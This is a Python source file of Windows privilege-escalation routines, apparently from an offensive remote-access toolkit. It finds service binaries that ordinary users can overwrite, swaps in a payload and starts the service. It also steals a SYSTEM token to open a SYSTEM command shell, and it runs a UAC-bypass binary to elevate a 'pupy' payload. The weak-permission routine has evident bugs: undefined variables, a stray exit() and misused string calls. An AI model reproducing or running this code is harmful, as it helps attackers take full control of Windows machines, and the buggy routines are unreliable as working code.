
from ctypes import *
import subprocess
import time
import shutil
import random
import os
import sys


def AdminCheck():
    try:
        return os.getuid()==0
    except AttributeError:
        return windll.shell32.IsUserAnAdmin() != 0

#http://stackoverflow.com/a/20804735
def get_winver():
    wv=sys.getwindowsversion()
    if hasattr(wv, 'service_pack_major'):  # python >= 2.7
        sp=wv.service_pack_major or 0
    else:
        import re
        r=re.search("\s\d$", wv.service_pack)
        sp=int(r.group(0)) if r else 0
    return (wv.major, wv.minor, sp)

#revised version of: https://github.com/heihachi/Coding-Projects/blob/master/Python/poly/xmulti_aeshell.py
#doesnt depend on dropping any sort of file anymore for the batch code
#http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
def CheckWeakPrivs(temp_dir):
	# attempt to search for weak permissions on applications

	# array for possible matches
	permatch=['BUILTIN\\Users:(I)(F)','BUILTIN\\Users:(F)']

	permbool=False
 
	a=[]
	b=[]

	cmd=["wmic.exe", "service", "list", "full"]
	p=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

	for line in iter(p.stdout.readline, b''):
		if ('PathName' in line) & ('system32' not in line):
			a.append(line.strip('PathName=').rstrip())

	ap=0
	bp=0
	weak_dir=[]
	weak_path=[]
	for i in range(0,len(a)):
		cmd=["cmd.exe", "/c", "icacls", a[i]]
		p=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

		for line in iter(p.stdout.readline, b''):
			cp=0
			while cp < len(permatch):
				j=line.find(permatch[cp])
				if j != -1:
					# we found a misconfigured directory
					if permbool==False:
						permbool=True
					bp=ap
					while True:
						if len(lines[bp].split('\\')) > 2:
							while bp <= ap:
								weak_dir.append(lines[bp])
								bp += 1
							exit()
						else:
							bp -= 1
				cp += 1
			ap += 1
	if permbool==False:
		return 'No directories with misconfigured premissions found.\n'
	if permbool==True:
		for i in range(0,len(weak_dir)):
			weak_path.append(weak_dir[i].strip(permatch[0],permatch[1]))
			i += 1

		r=random.randint(0,len(weak_path))

		if os.path.exists(weak_path[r]):
			shutil.move(weak_path[r], weak_path[r]+'.bak')
			shutil.move(temp_dir, weak_path[r])
		cmd=["wmic.exe", "service", weak_path[r], "call", "startservice"]
		p=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		return p.stdout.readline

#https://github.com/joren485/PyWinPrivEsc/blob/master/RunAsSystem.py
def RunAsSystem():
	LPVOID=c_void_p
	PVOID=LPVOID
	PSID=PVOID
	DWORD=c_uint32
	LPSTR=c_char_p
	HANDLE     =LPVOID
	INVALID_HANDLE_VALUE=c_void_p(-1).value
	LONG       =c_long
	WORD       =c_uint16

	READ_CONTROL                    =0x00020000
	STANDARD_RIGHTS_READ            =READ_CONTROL
	STANDARD_RIGHTS_REQUIRED        =0x000F0000

	TOKEN_ASSIGN_PRIMARY   =0x0001
	TOKEN_DUPLICATE        =0x0002
	TOKEN_IMPERSONATE      =0x0004
	TOKEN_QUERY            =0x0008
	TOKEN_QUERY_SOURCE     =0x0010
	TOKEN_ADJUST_PRIVILEGES=0x0020
	TOKEN_ADJUST_GROUPS    =0x0040
	TOKEN_ADJUST_DEFAULT   =0x0080
	TOKEN_ADJUST_SESSIONID =0x0100
	TOKEN_READ=(STANDARD_RIGHTS_READ | TOKEN_QUERY)
	tokenprivs =(TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072 | 4))
	TOKEN_ALL_ACCESS=(STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
			TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
			TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
			TOKEN_ADJUST_SESSIONID)

	PROCESS_QUERY_INFORMATION=0x0400

	class LUID(Structure):
		_fields_=[
			("LowPart",	 DWORD),
			("HighPart",	LONG),
		]
		
	class LUID_AND_ATTRIBUTES(Structure):
		_fields_=[
			("Luid",		LUID),
			("Attributes", DWORD),
		]

	class SID_AND_ATTRIBUTES(Structure):
		_fields_=[
			('Sid',         PSID),
			('Attributes',  DWORD),
		]

	class TOKEN_USER(Structure):
		_fields_=[
			('User', SID_AND_ATTRIBUTES),]

	class TOKEN_PRIVILEGES(Structure):
		_fields_=[
			("PrivilegeCount", DWORD),
			("Privileges",	 LUID_AND_ATTRIBUTES),
		]

	class PROCESS_INFORMATION(Structure):
		_fields_=[
			('hProcess',    HANDLE),
			('hThread',     HANDLE),
			('dwProcessId', DWORD),
			('dwThreadId',  DWORD),
		]

	class STARTUPINFO(Structure):
		_fields_=[
			('cb',              DWORD),
			('lpReserved',      LPSTR),
			('lpDesktop',       LPSTR),
			('lpTitle',         LPSTR),
			('dwX',             DWORD),
			('dwY',             DWORD),
			('dwXSize',         DWORD),
			('dwYSize',         DWORD),
			('dwXCountChars',   DWORD),
			('dwYCountChars',   DWORD),
			('dwFillAttribute', DWORD),
			('dwFlags',         DWORD),
			('wShowWindow',     WORD),
			('cbReserved2',     WORD),
			('lpReserved2',     LPVOID),    # LPBYTE
			('hStdInput',       HANDLE),
			('hStdOutput',      HANDLE),
			('hStdError',       HANDLE),
		]

	def EnablePrivilege(privilegeStr, hToken=None):
		"""Enable Privilege on token, if no token is given the function gets the token of the current process."""
		close=False
		if hToken==None:
			close=True
			TOKEN_ADJUST_PRIVILEGES=0x00000020
			TOKEN_QUERY=0x0008
			hToken=HANDLE(INVALID_HANDLE_VALUE)
			res=windll.advapi32.OpenProcessToken( windll.kernel32.GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), byref(hToken) )
	  
		privilege_id=LUID()
		res=windll.advapi32.LookupPrivilegeValueA(None, privilegeStr, byref(privilege_id))

		SE_PRIVILEGE_ENABLED=0x00000002
		laa=LUID_AND_ATTRIBUTES(privilege_id, SE_PRIVILEGE_ENABLED)
		tp=TOKEN_PRIVILEGES(1, laa)

		ERROR_NOT_ALL_ASSIGNED=1300

		res=windll.advapi32.AdjustTokenPrivileges(hToken, False, byref(tp), sizeof(tp), None, None)
		if not res:
			raise WinError()
		else:
			res=windll.kernel32.GetLastError()
			if res!=0:
				raise WinError()
		if close:
			windll.kernel32.CloseHandle(hToken)

	def GetTokenSid(hToken):
		"""Retrieve SID from Token"""
		dwSize=DWORD(0)
		pStringSid=LPSTR()
		
		TokenUser=1
		windll.advapi32.GetTokenInformation(hToken, TokenUser, byref(TOKEN_USER()), 0, byref(dwSize))
									
		address=windll.kernel32.LocalAlloc(0x0040, dwSize)
		
		windll.advapi32.GetTokenInformation(hToken, TokenUser, address, dwSize, byref(dwSize))

		pToken_User=cast(address, POINTER(TOKEN_USER))

		windll.advapi32.ConvertSidToStringSidA(pToken_User.contents.User.Sid, byref(pStringSid))
		sid=pStringSid.value
		
		windll.kernel32.LocalFree(address)
		return sid

	def procids():
		"""A list of every pid, sorted but first pids is winlogon.exe"""

		count=32
		while True:
			ProcessIds=(DWORD * count)()
			cb=sizeof(ProcessIds)
			BytesReturned=DWORD()
			if windll.psapi.EnumProcesses( byref(ProcessIds), cb, byref(BytesReturned)):
				if BytesReturned.value < cb:
					break
				else:
					count *= 2

		#winlogon_pid=0
		for index in range(int(BytesReturned.value/sizeof(DWORD))):
			ProcessId=ProcessIds[index]
			hProcess=windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, ProcessId)
			if hProcess:
				ImageFileName=( c_char * 260 )()
				if windll.psapi.GetProcessImageFileNameA(hProcess, ImageFileName, 260) > 0:
					filename=os.path.basename(ImageFileName.value)
					if filename=='winlogon.exe':
						winlogon_pid=ProcessIds[index]
				windll.kernel32.CloseHandle(hProcess)   

		pids=[ProcessIds[index] for index in range(int(BytesReturned.value/sizeof(DWORD)))]
		try:
			pids.remove(winlogon_pid)
			return [ winlogon_pid ] + pids
		except:
			return pids

	def GetLocalSystemProcessToken():
		"""Takes a list of pids and checks if the process has a token with SYSTEM user, if so it returns the token handle."""    
		pids=procids()

		for pid in pids:
			try:
				
				hProcess=windll.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)

				hToken=HANDLE(INVALID_HANDLE_VALUE)
				windll.advapi32.OpenProcessToken(hProcess, tokenprivs, byref(hToken))

				##If token SID is the SID of SYSTEM, return the token handle.
				if GetTokenSid(hToken)=='S-1-5-18':
					windll.kernel32.CloseHandle(hProcess)
					return hToken

				windll.kernel32.CloseHandle(hToken)
				windll.kernel32.CloseHandle(hProcess)

			except WindowsError:
				print "[!] Error:" + str(e)

	##Enable SE_DEBUG_NAME(debugprivileges) on the current process.
	EnablePrivilege('SeDebugPrivilege')

	##Get a SYSTEM user token.
	hToken=GetLocalSystemProcessToken()

	##Duplicate it to a Primary Token, so it can be passed to CreateProcess.
	hTokendupe=HANDLE( INVALID_HANDLE_VALUE )

	SecurityImpersonation=2
	TokenPrimary=1
	windll.advapi32.DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, None, SecurityImpersonation, TokenPrimary, byref( hTokendupe ) )

	##Now we have duplicated the token, we can close the orginal.
	windll.kernel32.CloseHandle(hToken)

	##Enable SE_ASSIGNPRIMARYTOKEN_NAME and SE_INCREASE_QUOTA_NAME, these are both needed to start a process with a token.
	EnablePrivilege( 'SeAssignPrimaryTokenPrivilege', hToken=hTokendupe )

	EnablePrivilege( 'SeIncreaseQuotaPrivilege', hToken=hTokendupe )

	##Enable SE_IMPERSONATE_NAME, so that we can impersonate the SYSTEM token.
	EnablePrivilege('SeImpersonatePrivilege')

	windll.advapi32.ImpersonateLoggedOnUser( hTokendupe )
	##Start the process with the token.
	try:
		lpProcessInformation=PROCESS_INFORMATION()
		lpStartupInfo=STARTUPINFO()
		CREATE_NEW_CONSOLE=0x00000010
		
		windll.advapi32.CreateProcessAsUserA(hTokendupe, r'C:\Windows\System32\cmd.exe', None, None, None, True, CREATE_NEW_CONSOLE, None, None, byref(lpStartupInfo), byref(lpProcessInformation))
		print('[+] PID: ' + str(lpProcessInformation.dwProcessId))
	except WindowsError as e :
		print('[!] Error:' + str(e))

	#Clean up, revert back to self and close the handles
	windll.advapi32.RevertToSelf()

	windll.kernel32.CloseHandle(hTokendupe)

def ByPassUAC_bin(bypass,pupy):
	startupinfo =subprocess.STARTUPINFO()
	startupinfo .dwFlags |= subprocess.STARTF_USESHOWWINDOW
	return subprocess.Popen([bypass, 'elevate', '/c ', pupy], stdin=None, stdout=None, stderr=None, shell=False, startupinfo=startupinfo)
